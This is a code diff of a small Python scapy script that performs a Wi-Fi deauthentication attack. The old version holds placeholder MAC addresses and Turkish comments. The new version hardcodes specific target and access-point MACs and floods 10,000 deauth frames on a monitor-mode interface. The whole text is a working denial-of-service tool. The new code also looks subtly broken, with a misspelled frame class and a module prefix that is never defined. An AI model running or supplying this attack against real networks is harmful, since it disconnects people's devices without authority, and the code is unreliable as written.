@@ -1,27 +1,11 @@
-import scapy.all as scapy
+import sys 
+from scapy.all import *
 
-def deauth_attack(target_mac, ap_mac):
-    # Deauthentication paketini oluştur
-    deauth_packet = scapy.Dot11(type=0, subtype=12, dest=target_mac, src=ap_mac)
+target_mac = "98:F6:21:83:ED:E0"
 
-    # Paketi gönder
-    scapy.sendp(deauth_packet)
-
-if __name__ == "__main__":
-    # Hedef cihazın MAC adresini gir
-    target_mac = "AA:BB:CC:DD:EE:FF"
-
-    # Erişim noktasının MAC adresini gir
-    ap_mac = "BB:CC:DD:EE:FF:AA"
-
-    # Deauthentication saldırısını başlat
-    deauth_attack(target_mac, ap_mac)
+ap_mac = "00:5F:67:31:1C:F6"
 
 
-def deauth_attack(target_mac, ap_mac):
-    # Deauthentication paketini oluştur
-    deauth_packet = scapy.Dot11(type=0, subtype=12, dest=target_mac, src=ap_mac)
+deauth_packet = scapy.RadioTap() / scapy.Dot11(addr1 = target_mac, addr2 = sys.argv[1], addr3 = sys.argv[1]) / scapy.Dot11Death()
 
-    # Paketi gönder
-    scapy.sendp(deauth_packet)
-
+sendp(deauth_packet, iface="wlan0mon", count = 10000, inter = .2)
